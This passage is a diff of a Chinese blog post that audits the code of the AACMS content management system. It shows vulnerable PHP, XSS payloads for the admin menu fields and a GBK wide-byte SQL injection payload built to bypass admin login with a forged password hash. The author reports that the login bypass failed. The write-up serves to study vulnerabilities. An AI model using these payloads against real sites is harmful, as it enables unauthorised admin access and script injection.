class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;3\&quot; name=\&quot;displayorder[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[displayorder]\&quot;&gt;&quot;</span>,<br>			<span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;25\&quot; name=\&quot;title[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;&quot;</span>.cplang(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;title&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>,<br>			<span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;40\&quot; name=\&quot;url[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[url]\&quot;&gt;&quot;</span><br>		), <span class="hljs-literal">TRUE</span>);<br>	&#125;<br>		<br>	<span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;misc_custommenu&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>		<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -388,9 +388,9 @@
 <p><code>url=&quot; onclick=&quot;alert(1)</code></p>
 <p><code>title=&quot; onclick=&quot;alert(1)</code></p>
 <p>需要进行url编码后发送</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png" srcset="/img/loading.gif" lazyload></p>
 <p>但这里的，如果测试XSS漏洞的话，可能黑盒会更快一些，因为已经知道了web应用没有对XSS进行一个校验，所以能插入的地方，就使劲插入payload，白盒可以少一些。</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png" srcset="/img/loading.gif" lazyload></p>
 <h5 id="无法复现的漏洞"><a href="#无法复现的漏洞" class="headerlink" title="无法复现的漏洞"></a>无法复现的漏洞</h5><h6 id="1-登录位置的宽字节注入"><a href="#1-登录位置的宽字节注入" class="headerlink" title="1.登录位置的宽字节注入"></a>1.登录位置的宽字节注入</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br>	<br>	<span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br>		<br>		<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br>		<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br>		<br>		<span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br>		<span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br>			<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>		&#125;<br>		<br>		dheader(ADMINSCRIPT);<br>		<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<br>		@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;	<br>		<span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
 
 <p><code>$username</code>直接拼接进查询语句，由于数据库编码为GBK，所以存在宽字节注入，插入payload之后，数据库执行日志如下：</p>
@@ -405,14 +405,14 @@
 <p>比对密码同时判断该账号是否为管理员</p>
 <p>OK，由于在根据<code>$username</code>去数据库查询处存在sql注入，所以，可以通过使用联合查询覆盖掉原来的查询数据，让数据库返回想要的数据</p>
 <p>根据数据库的字段，可以进行payload的构造</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png" srcset="/img/loading.gif" lazyload></p>
 <p><code>&amp;admin_username=zzz%df&#39; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &amp;admin_password=3</code></p>
 <p>其中字段三为数据库加密后的密码，字段五<code>groupid</code>必须为1，字段九<code>salt</code>用于字段三加密</p>
 <p>数据库最终执行语句如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM pre_member WHERE username=&#x27;zzz運&#x27; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &#x27;<br></code></pre></td></tr></table></figure>
 
 <p>代入数据库查询，返回的也是想要的值</p>
-<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png" srcset="/img/loading.gif" lazyload></p>
 <p>但就是无法成功复现，原因仍未发现😭</p>
 <p>真菜，复现都复现不出来😒</p>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/229981.html">https://www.freebuf.com/vuls/229981.html</a></p>
@@ -440,7 +440,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>代码审计-AACMS</div>
-      <div>http://example.com/2022/02/26/代码审计-AACMS/</div>
+      <div>http://example.com/2022/02/19/代码审计-AACMS/</div>
     </div>
     <div class="license-meta">
       
@@ -452,7 +452,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年2月26日</div>
+          <div>2022年2月19日</div>
         </div>
       
       
@@ -482,7 +482,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/" title="xss_bypass靶场">
+                      <a href="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/" title="xss_bypass靶场">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">xss_bypass靶场</span>
                         <span class="visible-mobile">上一篇</span>
@@ -492,7 +492,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/" title="小破站的SQL绕过">
+                      <a href="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/" title="小破站的SQL绕过">
                         <span class="hidden-mobile">小破站的SQL绕过</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
